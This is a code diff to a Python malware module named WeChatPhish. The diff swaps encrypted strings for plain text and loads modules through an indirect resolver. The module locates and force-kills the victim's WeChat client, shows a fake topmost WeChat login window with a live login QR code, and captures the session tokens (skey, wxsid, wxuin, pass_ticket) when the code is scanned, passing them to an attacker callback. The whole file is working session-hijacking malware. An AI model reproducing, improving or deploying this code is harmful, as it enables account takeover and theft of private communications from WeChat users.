@@ -1,15 +1,19 @@
-import os
-import re
-import time
-import json
-import urllib.request
-import urllib.parse
-import threading
+from core.resolver import (Resolver, _CTYPES, _SUBPROCESS, _URLLIB_PARSE)
+ctypes = Resolver.get_mod(_CTYPES)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+urllib.parse = Resolver.get_mod(_URLLIB_PARSE)
+
+from core.resolver import (Resolver, _OS, _RE, _TIME, _JSON, _THREADING)
+os = Resolver.get_mod(_OS)
+re = Resolver.get_mod(_RE)
+time = Resolver.get_mod(_TIME)
+json = Resolver.get_mod(_JSON)
+threading = Resolver.get_mod(_THREADING)
+
 import tkinter as tk
 from tkinter import Canvas, PhotoImage
 from PIL import Image, ImageTk
 import io
-from core.obfuscation import decrypt_string
 
 class WeChatPhish:
     def __init__(self, callback):
@@ -25,13 +29,13 @@ class WeChatPhish:
 
         try:
             import winreg
-            wechat_keys = [decrypt_string("PV0eHzkwKwcGKz5dHFoDFBpuJDwrEjEDLg=="), decrypt_string("PV0eHzkwKwcGKz5dHFoDFBpuJDwrOCELNA==")] 
+            wechat_keys = ["Software\\\\Tencent\\\\WeChat", "Software\\\\Tencent\\\\Weixin"] 
             for root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                 for wk in wechat_keys:
                     try:
                         with winreg.OpenKey(root, wk) as key:
                             path, _ = winreg.QueryValueEx(key, "InstallPath")
-                            for exe in [decrypt_string("OVc7Ay8ldwciEg=="), decrypt_string("OVcREyc/dwciEg==")]:
+                            for exe in ["WeChat.exe", "Weixin.exe"]:
                                 exe_path = os.path.join(path, exe)
                                 if os.path.exists(exe_path):
                                     self.wechat_exe = exe_path
@@ -42,8 +46,8 @@ class WeChatPhish:
         try:
             import winreg
             uninstall_keys = [
-                decrypt_string("PV0eHzkwKwcGKydREUsJCQFUDDcSBjAMPhgdSy5lJQ8cQB0FOgc8ECkeBVYuZTMUB1wLHy89NT4GIA9RClAI"),
-                decrypt_string("PV0eHzkwKwcGKz13JQ9SSVx8Fw8rDQUvMxQYVwFWAA4ybi8CIDU2FSkrNnsHSxQfAEYuDjwiMA00KzZtHFAICRpTFAcSDQ4HMw8DVg==")
+                "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Weixin",
+                "Software\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Weixin"
             ]
             for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                 for uk in uninstall_keys:
@@ -51,7 +55,7 @@ class WeChatPhish:
                         with winreg.OpenKey(root, uk) as key:
                             path, _ = winreg.QueryValueEx(key, "InstallLocation")
                             path = path.strip('"')
-                            for exe in [decrypt_string("OVc7Ay8ldwciEg=="), decrypt_string("OVcREyc/dwciEg==")]:
+                            for exe in ["WeChat.exe", "Weixin.exe"]:
                                 exe_path = os.path.join(path, exe)
                                 if os.path.exists(exe_path):
                                     self.wechat_exe = exe_path
@@ -60,12 +64,12 @@ class WeChatPhish:
         except: pass
 
         prefixes = [
-            os.environ.get("ProgramFiles(x86)", decrypt_string("LQgkNx4jNgUoFgcYNFAKHx0SUBN2Z3A=")),
-            os.environ.get("ProgramFiles", decrypt_string("LQgkNx4jNgUoFgcYNFAKHx0=")),
-            os.path.join(os.environ.get("AppData", ""), decrypt_string("QBwkNwI+OgM2"))
+            os.environ.get("ProgramFiles(x86)", "C:\\\\Program Files (x86)"),
+            os.environ.get("ProgramFiles", "C:\\\\Program Files"),
+            os.path.join(os.environ.get("AppData", ""), "..\\\\Local")
         ]
-        subfolders = [decrypt_string("OlcWCCs/LT4GIA97GlgS"), decrypt_string("OlcWCCs/LT4GIA9RClAI")]
-        exes = [decrypt_string("OVc7Ay8ldwciEg=="), decrypt_string("OVcREyc/dwciEg==")]
+        subfolders = ["Tencent\\\\WeChat", "Tencent\\\\Weixin"]
+        exes = ["WeChat.exe", "Weixin.exe"]
 
         for p in prefixes:
             for sf in subfolders:
@@ -78,7 +82,7 @@ class WeChatPhish:
         try:
             import psutil
             for proc in psutil.process_iter(['name', 'exe']):
-                if proc.info['name'] in [decrypt_string('OVc7Ay8ldwciEg=='), decrypt_string('OVcREyc/dwciEg==')]:
+                if proc.info['name'] in ["WeChat.exe", "Weixin.exe"]:
                     if proc.info['exe'] and os.path.exists(proc.info['exe']):
                         self.wechat_exe = proc.info['exe']
                         return True
@@ -88,29 +92,28 @@ class WeChatPhish:
 
     def kill_wechat(self):
         try:
-            import subprocess
-            subprocess.run(decrypt_string("GlMLACU4NQ56WAwYXVALWjlXOwMvJXcHIhI="), shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(decrypt_string("GlMLACU4NQ56WAwYXVALWjlXERMnP3cHIhI="), shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run("taskkill /f /im WeChat.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run("taskkill /f /im Weixin.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(1.5)
         except:
             pass
 
     def get_uuid(self):
-        url = decrypt_string('BkYMGz1rdk02GA1RHBcRAkBDCUUtPjRNMAQGVxVQCEUPQggCKmwiET8bDBYTSRYTCk9eDTs/ZAw/AExUE1cBRxRaJygAdwZfIR4ETFpNDxcLHAwCIzRxS3pdSglCCVZTEw==')
+        url = "https://login.wx.qq.com/jslogin?appid={self.appid}&fun=new&lang=zh_CN&_={int(time.time() * 1000)}"
         req = urllib.request.Request(url)
         try:
             resp = urllib.request.urlopen(req).read().decode('utf-8')
-            regx = decrypt_string('GVsWDyEmdzMIOwVfG1dIGQFWHUtzcXE+PlxDA1JODxQKXQ9FHwMVDT0eBBYHTA8eTg9YSWYNCkllXkg=')
+            regx = "window.QRLogin.code = (\\d+); window.QRLogin.uuid = \"(\\S+?)\""
             match = re.search(regx, resp)
             if match and match.group(1) == '200':
                 self.uuid = match.group(2)
                 return True
         except Exception as e:
-            print(decrypt_string("NRMlSxk0Ggo7A0poGlAVEk5nLSIKcTwQKBgYAlJCAwc="))
+            print("[!] WeChat Phish UUID error: {e}")
         return False
 
     def get_qr_image(self):
-        url = decrypt_string('BkYMGz1rdk02GA1RHBcRHwdKEQVgIChMORgHFwNLBRUKV1cQPTQ1BHQCH1EWRA==')
+        url = "https://login.weixin.qq.com/qrcode/{self.uuid}"
         try:
             req = urllib.request.Request(url)
             resp = urllib.request.urlopen(req).read()
@@ -131,14 +134,13 @@ class WeChatPhish:
             im = im.resize((180, 180), Image.Resampling.NEAREST)
             return im
         except Exception as e:
-            print(decrypt_string("NRMlSxk0Ggo7A0poGlAVEk5jKksrIytYegwPRQ=="))
+            print("[!] WeChat Phish QR err: {e}")
             return None
 
     def _schedule_close(self, relaunch=False):
         self.running = False
         if relaunch and self.wechat_exe and os.path.exists(self.wechat_exe):
             try:
-                import subprocess
                 subprocess.Popen([self.wechat_exe], creationflags=0x08000000)
             except:
                 pass
@@ -149,17 +151,17 @@ class WeChatPhish:
 
         tip = 1
         while self.running:
-            url = decrypt_string('BkYMGz1rdk02GA1RHBcRAkBDCUUtPjRNORADFRBQCFUDXw8OLCYhTzgeBBceVgETAA0UBCk4Nws5GAQFBksTH0hHDQIqbCIRPxsMFgdMDx4TFAwCPmwiFjMHFx4tBB0TAEZQHyc8PEwuHgddWhBGUE4DSFt+eCQ=')
+            url = "https://login.wx.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&uuid={self.uuid}&tip={tip}&_={int(time.time() * 1000)}"
             try:
                 req = urllib.request.Request(url)
                 resp = urllib.request.urlopen(req, timeout=35).read().decode('utf-8')
-                match = re.search(decrypt_string('GVsWDyEmdwE1Ew8FWmUCUUcJ'), resp)
+                match = re.search("window.code=(\\d+);", resp)
                 if match:
                     code = match.group(1)
                     if code == '201':
                         tip = 0
                     elif code == '200':
-                        redir_match = re.search(decrypt_string('GVsWDyEmdxA/EwNKF1oSJRtAEVZseQUxcUhDGg=='), resp)
+                        redir_match = re.search("window.redirect_uri=\"(\\S+?)\"", resp)
                         if redir_match:
                             redirect_uri = redir_match.group(1) + '&fun=new&version=v2'
                             self.get_session(redirect_uri)
@@ -179,10 +181,10 @@ class WeChatPhish:
         try:
             req = urllib.request.Request(redirect_uri)
             resp = urllib.request.urlopen(req).read().decode('utf-8')
-            skey = re.search(decrypt_string('UkETDjdvcUxwSEMEXUoNHxcM'), resp)
-            wxsid = re.search(decrypt_string('UkUAGCc1Z0p0XVURThYRAh1bHFU='), resp)
-            wxuin = re.search(decrypt_string('UkUAHic/Z0p0XVURThYRAhtbFlU='), resp)
-            pass_ticket = re.search(decrypt_string('UkIZGD0OLQs5HA9MTBFIUFEbREQ+MCoRBQMDWxlcEkQ='), resp)
+            skey = re.search("<skey>(.*?)</skey>", resp)
+            wxsid = re.search("<wxsid>(.*?)</wxsid>", resp)
+            wxuin = re.search("<wxuin>(.*?)</wxuin>", resp)
+            pass_ticket = re.search("<pass_ticket>(.*?)</pass_ticket>", resp)
             data = {
                 "skey": skey.group(1) if skey else "",
                 "wxsid": wxsid.group(1) if wxsid else "",
@@ -192,7 +194,7 @@ class WeChatPhish:
             if self.callback:
                 self.callback(data)
         except Exception as e:
-            print(decrypt_string("NRMlSx00KhEzGAQYFFwSGQYSHRk8a3kZPwo="))
+            print("[!] Session fetch err: {e}")
 
     def on_close(self):
         self._schedule_close(relaunch=False)
@@ -200,7 +202,6 @@ class WeChatPhish:
     def _show_in_taskbar(self):
         """WinAPI хак, чтобы безрамочное окно стало видно в Панели задач (taskbar)"""
         try:
-            import ctypes
             hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
             style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
             style = (style & ~0x00000080) | 0x00040000
@@ -208,7 +209,7 @@ class WeChatPhish:
             self.root.withdraw()
             self.root.deiconify()
         except Exception as e:
-            print(decrypt_string("NRMlSxEiMQ0tKANWLU0HCQVQGRluNCsQYA=="), e)
+            print("[!] _show_in_taskbar err:", e)
 
     def run_ui(self):
         if not self.get_wechat_path():
@@ -227,7 +228,7 @@ class WeChatPhish:
         self.root.attributes('-topmost', True)
         self.root.overrideredirect(True)
         self.root.after(10, self._show_in_taskbar)
-        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", decrypt_string("GVcbAy8ldws5GA=="))
+        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "wechat.ico")
         if os.path.exists(icon_path):
             try:
                 self.root.iconbitmap(icon_path)
@@ -245,9 +246,9 @@ class WeChatPhish:
         title_label.pack(side=tk.LEFT, pady=0, padx=12)
         btns_frame = tk.Frame(title_bar, bg="#2c2c2c")
         btns_frame.pack(side=tk.RIGHT, padx=5)
-        settings_button = tk.Label(btns_frame, text=decrypt_string("MkdKXXdo"), bg="#2c2c2c", fg="#888888", font=("Segoe UI", 12))
+        settings_button = tk.Label(btns_frame, text="\\u2699", bg="#2c2c2c", fg="#888888", font=("Segoe UI", 12))
         settings_button.pack(side=tk.LEFT, padx=10)
-        close_button = tk.Label(btns_frame, text=decrypt_string("MkdKXH9k"), bg="#2c2c2c", fg="#888888", font=("Segoe UI", 10))
+        close_button = tk.Label(btns_frame, text="\\u2715", bg="#2c2c2c", fg="#888888", font=("Segoe UI", 10))
         close_button.pack(side=tk.LEFT, padx=5)
         close_button.bind("<Button-1>", lambda e: self.on_close())
         def on_enter(e, widget): widget['fg'] = 'white'
@@ -278,4 +279,3 @@ def run_phish(callback, error_callback=None, success_callback=None):
         phish.root.mainloop()
     elif error_callback:
         error_callback(res)
-
